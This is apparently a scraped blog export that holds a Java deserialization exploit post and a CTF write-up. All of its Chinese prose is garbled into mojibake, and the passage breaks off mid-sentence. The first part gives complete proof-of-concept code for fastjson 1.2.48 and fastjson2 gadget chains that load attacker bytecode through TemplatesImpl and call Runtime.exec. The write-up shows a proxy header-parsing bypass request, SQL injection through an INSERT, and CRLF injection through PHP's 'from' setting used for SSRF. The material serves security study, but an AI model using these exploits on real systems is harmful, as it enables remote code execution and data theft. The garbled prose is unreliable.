ç»„åˆåˆ©ç”¨é“¾æ—¢ç„¶åªèƒ½è§¦å‘getæ–¹æ³•çš„è°ƒç”¨é‚£ä¹ˆå¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡è§¦å‘TemplatesImplçš„getOutputPropertiesæ–¹æ³•å®ç°åŠ è½½ä»»æ„å­—èŠ‚ç æœ€ç»ˆè§¦å‘æ¶æ„æ–¹æ³•è°ƒç”¨ è€Œè§¦å‘toStringæ–¹æ³•æˆ‘ä»¬ä¹Ÿæœ‰ç°æˆçš„é“¾ï¼Œé€šè¿‡BadAttributeValueExpExceptionè§¦å‘å³å¯ å› æ­¤æˆ‘ä»¬å¾ˆå®¹æ˜“å†™å‡ºåˆ©ç”¨é“¾å­ fastjson1Mavenä¾èµ– 12345678910&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.19.0-GA&lt;/version&gt;&lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.48&lt;/version&gt;&lt;/dependency&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;y4tacker&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val, jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(val); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; fastjson21234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.alibaba.fastjson2.JSONArray;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test &#123; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125; public static void main(String[] args) throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;y4tacker&quot;); setValue(templates, &quot;_tfactory&quot;, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field valfield = val.getClass().getDeclaredField(&quot;val&quot;); valfield.setAccessible(true); valfield.set(val, jsonArray); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr); objectOutputStream.writeObject(val); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; ä¸ºä»€ä¹ˆfastjson1çš„1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨ä»1.2.49å¼€å§‹ï¼Œæˆ‘ä»¬çš„JSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹çœŸæ­£æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³• åœ¨å…¶SecureObjectInputStreamç±»å½“ä¸­é‡å†™äº†resolveClass,åœ¨å…¶ä¸­è°ƒç”¨äº†checkAutoTypeæ–¹æ³•åšç±»çš„æ£€æŸ¥ å¦‚ä½•çªç ´å‘¢ï¼Ÿè¯·çœ‹ä¸‹ç¯‡æ–‡ç« FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ)","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"2023BiosCTF-VulnDrive2(å¾ˆå®æˆ˜æ¨è)","slug":"year/2023/1/2023BiosCTF-VulnDrive2-å¾ˆå®æˆ˜æ¨è","date":"2023-01-23T09:04:28.000Z","updated":"2024-08-04T09:01:49.689Z","comments":true,"path":"2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-å¾ˆå®æˆ˜æ¨è/","link":"","permalink":"https://y4tacker.github.io/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/","excerpt":"","text":"2023BiosCTF-VulnDrive2åæ§½æ¯”èµ›çš„æ—¶å€™åé¢å®Œæ•´åˆ©ç”¨å·²ç»ä¸²èµ·æ¥äº†ï¼Œè„‘æŠ½å¡åœ¨äº†SSRFåˆ©ç”¨ä¸Šï¼Œè¿˜æ˜¯å¤ªæ­»è„‘ç­‹äº† Dockerå¤‡ä»½ï¼šhttps://github.com/Y4tacker/CTFBackup/blob/main/2023/BiosCTF/vulndrive2.zip æ­£æ–‡ç¯å¢ƒé¦–å…ˆç®€å•çœ‹çœ‹docker-compose.ymlï¼Œå‘ç°phpç¯å¢ƒåœ¨å¤–ç½‘ æ ¹æ®networksé…ç½®å¯çŸ¥wafä¸å…¶ä»–ä¸¤ä¸ªç¯å¢ƒäº’é€šï¼Œfrontendä¸appä¸äº’é€š å®¡è®¡ä»¥ä¸‹ä¸ºäº†æ–¹ä¾¿å™è¿°æ€è·¯ï¼Œå°†è°ƒæ•´è®²è§£çš„é¡ºåºï¼Œå…¶ä¸­ä¼šæ¶‰åŠåˆ°éƒ¨åˆ†ç©¿æ’ wafè¿™ä¸ªå®¹å™¨ä¸­è¿è¡Œäº†ä¸€ä¸ªgoç¨‹åº 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;net/http&quot; &quot;net/http/httputil&quot; &quot;net/url&quot; &quot;strings&quot;)var invalid = [6]string&#123;&quot;&#x27;&quot;, &quot;\\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;&#125;func ProxyRequestHandler(proxy *httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) &#123; return func(w http.ResponseWriter, r *http.Request) &#123; if(r.Header.Get(&quot;X-pro-hacker&quot;)!=&quot;&quot;)&#123; fmt.Fprintf(w, &quot;Hello Hacker!\\n&quot;) return &#125; if(strings.Contains(r.Header.Get(&quot;flag&quot;), &quot;gimme&quot;))&#123; fmt.Fprintf(w, &quot;No flag For you!\\n&quot;) return &#125; if(r.Header.Get(&quot;Token&quot;)!=&quot;&quot;)&#123; for _, x := range invalid &#123; if(strings.Contains(r.Header.Get(&quot;Token&quot;), x))&#123; fmt.Fprintf(w, &quot;Hello Hacker!\\n&quot;) return &#125; &#125; &#125; proxy.ServeHTTP(w, r) &#125;&#125;func main() &#123; url, err := url.Parse(&quot;http://app:5000&quot;) if err != nil &#123; fmt.Println(err) &#125; proxy := httputil.NewSingleHostReverseProxy(url) http.HandleFunc(&quot;/&quot;, ProxyRequestHandler(proxy)) http.HandleFunc(&quot;/admin&quot;, func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Hello World!\\n&quot;)&#125;) log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))&#125; å­˜åœ¨ä¸¤ä¸ªè·¯ç”±/ä¸/adminï¼Œå…¶ä¸­/è·¯ç”±å°†æˆ‘ä»¬çš„è¯·æ±‚è½¬å‘åˆ°http://app:5000 åŒæ—¶å¯¹headerä¸­çš„X-pro-hackerã€flagã€Tokenä¸‰ä¸ªå­—æ®µåšäº†é™åˆ¶ è¦æ±‚X-pro-hackerä¸ºç©ºï¼Œflagä¸èƒ½å‡ºç°gimmeï¼ŒTokenåˆ™æ˜¯ä¸èƒ½æœ‰[6]string&#123;&quot;&#39;&quot;, &quot;\\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;&#125;è¿™äº›å­—ç¬¦ åœ¨pythonçš„flaské¡¹ç›®ä¸­åˆ™è¦æ±‚request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;)ï¼Œæ³¨æ„ä¸€ä¸ªæ˜¯==ä¸€ä¸ªæ˜¯in è¿™é‡Œåˆ™éœ€è¦åˆ©ç”¨goä¸flaskè§£æçš„å·®å¼‚æ€§ï¼Œ goå½“ä¸­åªè·å–ç¬¬ä¸€ä¸ªheaderçš„å†…å®¹ï¼Œ åœ¨flaskå½“ä¸­ä¼šæŠŠheaderå½“ä¸­çš„_æ›¿æ¢ä¸º-ï¼ŒåŒæ—¶å¦‚æœheaderåŒå†™ä¼šç”¨,è¿›è¡Œæ‹¼æ¥ å› æ­¤æˆ‘ä»¬å¦‚æœæ„é€ è¿™æ ·çš„è¯·æ±‚ï¼Œåˆ™å¯ä»¥ç»•è¿‡goç«¯çš„æ ¡éªŒ 1234GET / HTTP/1.1X_pro-hacker: Pro-hackerflag: flag: gimme åŒæ—¶åœ¨flaskçœ¼ä¸­ä»¥ä¸Šå†…å®¹æœ€ç»ˆä¼šè½¬æ¢ä¸º 123GET / HTTP/1.1X-pro-hacker: Pro-hackerflag: ,gimme æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å…·ä½“çœ‹çœ‹flaskéƒ¨åˆ† appé¦–å…ˆåœ¨é‡Œé¢ä¼šåˆå§‹åŒ–sqliteæ•°æ®åº“ï¼Œå°†flagä¿å­˜åˆ°äº†usersä¸flagä¸¤å¼ è¡¨ 1234567891011121314151617181920212223242526def init_db(): try: conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),&#x27;users.db&#x27;)) cursor = conn.cursor() result = cursor.executescript(f&quot;&quot;&quot; CREATE TABLE IF NOT EXISTS users ( username TEXT, token TEXT ); CREATE TABLE IF NOT EXISTS flag ( flag_is_here TEXT ); Delete from users; Delete from flag; INSERT INTO users values (&#x27;user&#x27;,&#x27;some_randomtoken&#x27;), (&#x27;admi&#x27;,&#x27;some_randomtoken&#x27;), ( &#x27;admin&#x27;, &#x27;&#123;FLAG&#125;&#x27; ); INSERT INTO flag values (&#x27;&#123;FLAG&#125;&#x27;); &quot;&quot;&quot;) conn.commit() return True except: return False ç¨‹åºä»…æœ‰ä¸€ä¸ªè·¯ç”±ï¼Œè¦æ±‚headerä¸­çš„X-pro-hackerã€flagå­—æ®µä¸ºæŒ‡å®šå†…å®¹ åŒæ—¶æ ¹æ®headerä¸­çš„å‚æ•°Tokenåšæ•°æ®åº“çš„æŸ¥è¯¢æ“ä½œ å¦å¤–æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœå­˜åœ¨userå‚æ•°é‚£ä¹ˆä¼šå–å‰38ä½æ‰§è¡Œadd_useræ“ä½œ 1234567891011121314151617181920212223242526def add_user(user,token): q = f&quot;INSERT INTO users values (&#x27;&#123;user&#125;&#x27;,&#x27;&#123;token&#125;&#x27;)&quot; db_query(q) return @app.route(&quot;/&quot;)def index(): while not init_db(): continue if request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;): try: if request.headers.get(&quot;Token&quot;): token = request.headers.get(&quot;Token&quot;) token = token[:16] token = token.replace(&quot; &quot;,&quot;&quot;).replace(&#x27;&quot;&#x27;,&quot;&quot;) if request.form.get(&quot;user&quot;): user = request.form.get(&quot;user&quot;) user = user[:38] add_user(user,token) query = f&#x27;SELECT * FROM users WHERE token=&quot;&#123;token&#125;&quot;&#x27; res = db_query(query) res = res.fetchone() return res[1] if res and len(res[0])&gt;0 else &quot;INDEX\\n&quot; except Exception as e: print(e) return &quot;INDEX\\n&quot; é¦–å…ˆæ˜¯request.form.get(&quot;user&quot;),è¿™ä¸ªæ˜¯POSTè¡¨å•çš„å‚æ•°ï¼Œæˆ‘ä»¬å¦‚ä½•èƒ½æˆåŠŸä¼ é€’å‘¢ï¼Ÿæ¯•ç«Ÿå½“å‰è·¯ç”±åªæ”¯æŒGETè¯·æ±‚ å…¶å®flaskè¯†åˆ«request.formæ˜¯ä¾æ®Headerå¤´æ˜¯å¦æ˜¯Content-Type:application/x-www-form-urlencodedæ¥åˆ¤æ–­çš„ï¼Œå› æ­¤æˆ‘ä»¬åªè¦åŠ ä¸Šå¹¶æŠŠå‚æ•°æ”¾åœ¨è¯·æ±‚ä½“å½“ä¸­å³å¯ å› æ­¤å¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦é€šè¿‡sqlæ³¨å…¥è·å–åˆ°flagè¡¨ä¸­flag_is_hereå­—æ®µçš„å†…å®¹ï¼Œç”±äºtokenåœ¨goç«¯åšäº†å­—ç¬¦é™åˆ¶ï¼Œæˆ‘ä»¬è€ƒè™‘ä»…åœ¨userå­—æ®µä¸­æ‰§è¡Œæ³¨å…¥ ç”±äºflagè¡¨ä¸­ä»…æœ‰ä¸€ä¸ªflag_is_hereå­—æ®µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨*æ›¿ä»£å‡å°‘payloadé•¿åº¦ ç”±äºadd_userå½“ä¸­ä¸ºinserté‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘æ’å…¥å†æŸ¥è¯¢çš„æ–¹å¼ï¼Œé€šè¿‡ç›²æ³¨è·å–æ•°æ® æ„é€ å¦‚ä¸‹ï¼Œå‘ç°åˆšå¥½é•¿åº¦ä¸º36ï¼Œè¿˜é¢„ç•™äº†ä¸¤ä¸ªé•¿åº¦çš„ä½ç½®ï¼Œ(æ¯•ç«Ÿflagé•¿åº¦ä¹Ÿä¸ä¼šè¶…è¿‡1000ï¼Œæ‰€ä»¥å®Œå…¨å¤Ÿç”¨äº†)ï¼Œé€šè¿‡ä¸‹é¢çš„è¯­å¥æˆ‘ä»¬æ¯æ¬¡å¯ä»¥å°†flagçš„ä¸€ä¸ªå­—ç¬¦å¸¦å…¥åˆ°userè¡¨ä¸­ ä¹‹åæˆ‘ä»¬é€šè¿‡selectè¯­å¥æŸ¥è¯¢å•å­—ç¬¦çš„tokenï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¿”å›INDEXï¼Œå­˜åœ¨åˆ™è¿”å›tokenå†…å®¹ï¼Œä¸æ–­é‡å¤ä¸Šè¿°æ­¥éª¤å³å¯è·å–åˆ°flagæ‰€æœ‰å†…å®¹ 1234query = f&#x27;SELECT * FROM users WHERE token=&quot;&#123;token&#125;&quot;&#x27;res = db_query(query)res = res.fetchone()return res[1] if res and len(res[0])&gt;0 else &quot;INDEX\\n&quot; frontendä¸Šé¢å·²ç»ä¸²èµ·æ¥äº†æœ€åæ¥çœ‹çœ‹frontendéƒ¨åˆ† ä»Dockerfileå¯çŸ¥ç¯å¢ƒæ˜¯php8.1å¹¶ä¸”åœ¨uploadsè·¯å¾„ä¸‹æœ‰ä¸ª.htaccessé…ç½®æ–‡ä»¶ 12345FROM php:8.1-apacheCOPY src/ /var/www/html/RUN mkdir /var/www/html/uploadsRUN chown www-data:www-data /var/www/html/uploadsCOPY .htaccess /var/www/html/uploads/ è€Œè¿™ä¸ªé…ç½®æ–‡ä»¶ä»…ä»…åªæœ‰ä¸€è¡Œï¼Œç¦æ­¢ç›´æ¥è®¿é—®uploadsè·¯å¾„ä¸‹çš„æ–‡ä»¶ 1Deny from all æ¥ä¸‹æ¥çœ‹çœ‹ä»£ç ï¼Œç®€ç®€å•å•åªæœ‰å‡ ä¸ªæ–‡ä»¶ æ¥ä¸‹æ¥æ‰€æœ‰ä»£ç éƒ½ä¸ºå»é™¤å‰ç«¯æ ·å¼éƒ¨åˆ†ï¼Œä»…ä¿ç•™phpä»£ç  ç™»å½•é¡µé¢æ¥æ”¶usernameå‚æ•°å¹¶ä¿å­˜åˆ°sessionå½“ä¸­ï¼Œä¹‹åæ ¹æ®sessionidç”Ÿæˆéš”ç¦»ç”¨æˆ·ç›®å½• 123456789101112131415161718192021222324//login.php&lt;?phpsession_start();if (!file_exists(&#x27;uploads&#x27;)) &#123; mkdir(&#x27;uploads&#x27;);&#125;if(isset($_POST[&#x27;submit&#x27;]))&#123; if(isset($_POST[&#x27;username&#x27;]))&#123; $_SESSION[&quot;username&quot;] = $_POST[&quot;username&quot;]; $folder = &#x27;./uploads/&#x27;.session_id().&quot;/&quot;; if (!file_exists($folder)) &#123; mkdir($folder); &#125; $_SESSION[&#x27;folder&#x27;] = $folder; header(&quot;Location: /index.php&quot;); die(); &#125;else&#123; echo &quot;no username provided&quot;; &#125;&#125;?&gt; æ¥ä¸‹æ¥æ˜¯index.phpéƒ¨åˆ†ï¼Œè¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½ä¸€ä¸ªæ˜¯æ ¹æ®å‚æ•°newåˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒåŒæ—¶å¯¹å‚æ•°newç”¨check_nameå‡½æ•°åšäº†æ ¡éªŒ 1234567891011121314151617$FOLDER = $_SESSION[&#x27;folder&#x27;];//create new folder inside uploads using get parameterif (isset($_GET[&#x27;new&#x27;])) &#123; if(check_name($_GET[&quot;new&quot;]))&#123; $newfolder = $FOLDER.$_GET[&#x27;new&#x27;]; if (!file_exists($newfolder)) &#123; mkdir($newfolder); &#125;else&#123; $error = &quot;folder already exist&quot;; &#125; &#125;else&#123; die(&#x27;not allowed&#x27;); &#125;&#125; check_nameè¿‡æ»¤äº†ç¬¦å·.ä¸/ï¼ŒåŒæ—¶é‡Œé¢è¿˜è°ƒç”¨äº†reportå‡½æ•° 1234567891011121314151617181920function check_name($filename)&#123; if(gettype($filename)===&quot;string&quot;)&#123; if(preg_match(&quot;/[.\\/]/i&quot;,$filename))&#123; report(); return false; &#125;else&#123; return true; //safe &#125; &#125; else&#123; return false; &#125;&#125;function report()&#123; //report usename ini_set(&quot;from&quot;,$_SESSION[&#x27;username&#x27;]); file_get_contents(&#x27;http://localhost/report.php&#x27;);&#125; å¦ä¸€ä¸ªæ˜¯æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œå¯ä»¥æŒ‡å®špathä¸Šä¼ æ–‡ä»¶ï¼Œä¸è¿‡å¯æƒœä¹Ÿç»è¿‡check_nameåšäº†æ ¡éªŒï¼Œå¦ä¸€ç‚¹æ–‡ä»¶åå–åç¼€ï¼Œå¹¶ä½¿ç”¨uniqidå‡½æ•°è·å–éšæœºå‰ç¼€ï¼Œ å› æ­¤æˆ‘ä»¬ä¾¿ä¸èƒ½ä¸Šä¼ ä¸€äº›é…ç½®æ–‡ä»¶è¦†ç›–åŸæ¥çš„htaccessä¸‹çš„é…ç½® åŒæ—¶è™½ç„¶å¯¹åç¼€æ²¡æœ‰è¿‡æ»¤ï¼Œç”±äºæœ¬èº«æœ‰htaccessä¸‹çš„é™åˆ¶ä¹Ÿæ— æ³•è®¿é—®åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ 12345678910111213141516171819202122232425262728if(isset($_POST[&quot;submit&quot;]))&#123; if(isset($_FILES[&#x27;file&#x27;])&amp;&amp; isset($_POST[&#x27;path&#x27;]))&#123; if(!check_name($_POST[&quot;path&quot;]))&#123; die(&quot;not allowed&quot;); &#125; $file = $_FILES[&#x27;file&#x27;]; $fileName = $file[&#x27;name&#x27;]; $fileSize = $file[&#x27;size&#x27;]; $fileError = $file[&#x27;error&#x27;]; $fileExt = explode(&#x27;.&#x27;, $fileName); $fileActualExt = strtolower(end($fileExt)); if($fileError === 0)&#123; if($fileSize &lt; 100000)&#123; $name = uniqid(&#x27;&#x27;, true).&quot;.&quot;.$fileActualExt; $fileDestination = $FOLDER.$_POST[&#x27;path&#x27;]; upload($file[&#x27;tmp_name&#x27;], $fileDestination,$name); header(&quot;Location: index.php?uploadsuccess&quot;); &#125;else&#123; $error = &quot;Your file is too big!&quot;; &#125; &#125;else&#123; $error = &quot;There was an error uploading your file!&quot;; &#125; &#125;else&#123; $error = &quot;parameter missing&quot;; &#125;&#125; æœ€åæ˜¯view.phpï¼Œæ ¹æ®å‚æ•°folå¯ä»¥æŸ¥çœ‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼ŒåŒæ—¶ä¹Ÿæœ‰check_nameåšè·¯å¾„é™åˆ¶ 12345678910111213141516171819$FOLDER = $_SESSION[&#x27;folder&#x27;];$dirr = [&#x27;.&#x27;,&#x27;..&#x27;];if(isset($_GET[&#x27;fol&#x27;]))&#123; //echo $FOLDER.$_GET[&#x27;fol&#x27;]; if(check_name($_GET[&#x27;fol&#x27;]) &amp;&amp; is_dir($FOLDER.$_GET[&#x27;fol&#x27;]))&#123; $c = &quot;&quot;; $files = array_diff(scandir($FOLDER.$_GET[&#x27;fol&#x27;]),$dirr); foreach ($files as $f) &#123; $c.= &quot;&lt;li class=\\&quot;list-group-item\\&quot;&gt;&lt;a href=&#x27;/view.php?file=&quot;.$_GET[&#x27;fol&#x27;].&quot;/&quot;.$f.&quot;&#x27;&gt;$f&lt;/a&gt;&lt;/li&gt;&quot;; &#125; echo str_replace(&quot;CONTENT&quot;,$c,$files_template); &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;folder not found&lt;/div&gt;&#x27;; &#125;&#125; æ ¹æ®å‚æ•°fileå¯ä»¥æŸ¥çœ‹å¯¹åº”çš„æ–‡ä»¶å†…å®¹ï¼Œä¸è¿‡æœ‰é™åˆ¶åªèƒ½è¯»å–åç¼€ä¸ºtxtã€pngä¸jpgåç¼€çš„æ–‡ä»¶ å¦‚æœæ³¨æ„çœ‹å¯ä»¥çœ‹åˆ°è¿™é‡Œtypeçš„å†™æ³•æœ‰ç‚¹å°é—®é¢˜ç»™äº†æˆ‘ä»¬æ“ä½œçš„ç©ºé—´ ï¼Œåé¢ä¼šæåˆ° 12345678910111213141516171819202122232425262728293031323334353637if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $ext = explode(&#x27;.&#x27;, $file); $type = substr(strtolower(end($ext)),0,3); $file = $FOLDER.&quot;/&quot;.$file; if($type===&quot;txt&quot;)&#123; try &#123; if(file_exists($file))&#123; chdir($FOLDER); echo file_get_contents($_GET[&#x27;file&#x27;]); &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;; &#125; &#125; catch (\\Throwable $th) &#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;; &#125; &#125; else if($type===&quot;png&quot; || $type===&quot;jpg&quot;)&#123; try &#123; if(file_exists($file))&#123; chdir($FOLDER); echo &quot;&lt;img src=\\&quot;data:image/$type;base64,&quot;.base64_encode(file_get_contents($_GET[&#x27;file&#x27;])).&quot;\\&quot; &gt;&quot;; &#125;else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;File not found!&lt;/div&gt;&#x27;; &#125; &#125; catch (Throwable $th) &#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Some error Occured&lt;/div&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;Invaild type&lt;/div&gt;&#x27;; &#125;&#125; SSRFæ—¢ç„¶ä¸èƒ½rceï¼Œé‚£æœ‰ä»€ä¹ˆåŠæ³•å‘¢ï¼ŸssrfåŒæ—¶åˆèƒ½æ§åˆ¶header ç­”æ¡ˆåœ¨reportå‡½æ•°ä¸­ 123456function report()&#123; //report usename ini_set(&quot;from&quot;,$_SESSION[&#x27;username&#x27;]); file_get_contents(&#x27;http://localhost/report.php&#x27;);&#125; å¯ä»¥åœ¨ç½‘ä¸Šæœç´¢åˆ°è¿™ä¸ªhttps://bugs.php.net/bug.php?id=81680 ä»æ¼æ´æè¿°å¯ä»¥çœ‹åˆ°å¦¥å¦¥çš„CRLFæ³¨å…¥ When we set â€œFromâ€ field by setting ini setting â€œfromâ€, which is used for â€œftpâ€ and â€œhttpâ€ file wrapper, it can inject an arbitrary string in the raw socket message. Since the injected string can contain CR-LF sequence(\\r\\n), this can be used to interrupt the flow of FTP stream or injecting/smuggling an outgoing HTTP request. åŒæ—¶ä¸‹é¢è¿˜ç»™äº†ä¸€ä¸ªç®€æ´çš„ä¾‹å­ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ³¨å…¥çš„Headeråœ¨æœ€ä¸Šæ–¹ï¼Œé‚£ä¹ˆå²‚ä¸æ˜¯æƒ³æ§åˆ¶å•¥æ§åˆ¶å•¥å˜ ä¸ºä»€ä¹ˆä¸èƒ½æ±¡æŸ“HOSTç„¶è€Œå½“æˆ‘ä»¬ç®€å•æ„é€ å¥½usernameå‘è¿‡å»è§¦å‘reportåä¼šå‘ç°ä»€ä¹ˆéƒ½æ²¡å‘ç”Ÿ è¿™é‡Œæˆ‘ä»¬å…ˆæœ¬åœ°æµ‹è¯•ä¸‹ 1234567891011121314151617&lt;?php/** * Author: Y4tacker */function report($username)&#123; ini_set(&quot;from&quot;,$username); file_get_contents(&#x27;http://ip:1234/report.php&#x27;);&#125;if(isset($_POST[&#x27;name&#x27;]))&#123; report($_POST[&#x27;name&#x27;]);&#125;; æ˜æ˜Hostå½“ä¸­ç«¯å£å·²ç»å˜äº†ï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯1234å‘¢ï¼Ÿæ¯”èµ›æœŸé—´å°±å¡åœ¨æœ€åä¸€æ­¥ä¸Šï¼Œå±äºæ˜¯è„‘æŠ½äº†ä¸€ç›´è§‰å¾—æ˜¯æœ¬åœ°ç¯å¢ƒé—®é¢˜2333 å®é™…ä¸Šåœ¨æ¯”èµ›åï¼Œç»è¿‡ç®€å•çš„phpæºç è°ƒè¯•æˆ‘ä»¬å¯ä»¥å‘ç° äº‹å®ä¸Šå…¶å®åœ¨å‘é€æ•°æ®å‰ï¼Œphpå·²ç»æ ¹æ®æˆ‘ä»¬çš„urlä¸å¯¹åº”ipå’Œportå»ºç«‹å¥½äº†è¿æ¥ ä¹‹åå†å‘é€å®Œæ•´æ•°æ®åŒ… å› æ­¤ä¸è®ºæˆ‘ä»¬å¦‚ä½•æ±¡æŸ“Hostéƒ½æ˜¯åœ¨åŸæœ‰çš„tcpè¿æ¥ä¸Šè¿›è¡Œçš„é€šä¿¡ é‚£æˆ‘ä»¬æ€ä¹ˆåŠå‘¢ï¼Ÿè™½ç„¶èƒ½æˆåŠŸCRLFæ³¨å…¥ï¼Œä½†å¦‚ä½•æ§åˆ¶HOSTå‘¢ï¼Ÿ æˆåŠŸçš„SSRF å°è¯•çºµè§‚å…¨å±€æ‰€æœ‰ä»£ç ï¼Œæˆ‘ä»¬åªèƒ½çœ‹åˆ°view.phpå½“ä¸­å­˜åœ¨å¯æ§åˆ¶çš„ç‚¹ è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰è¯´è¿™ä¸ªè·å–$typeå­˜åœ¨é—®é¢˜ä¹ˆï¼Ÿ ä¹ä¸€çœ‹è¿™é‡Œé€»è¾‘æœ¬æ¥æ˜¯åˆ¤æ–­åç¼€åï¼Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä¹‹åå†è¯»å–ï¼Œçœ‹ç€æ²¡ä»€ä¹ˆé—®é¢˜å‘€ï¼Ÿ è€Œé—®é¢˜å°±åœ¨äºè¿™ä¸ªtypeæ˜¯å–.åçš„ä¸‰ä¸ªå­—ç¬¦ 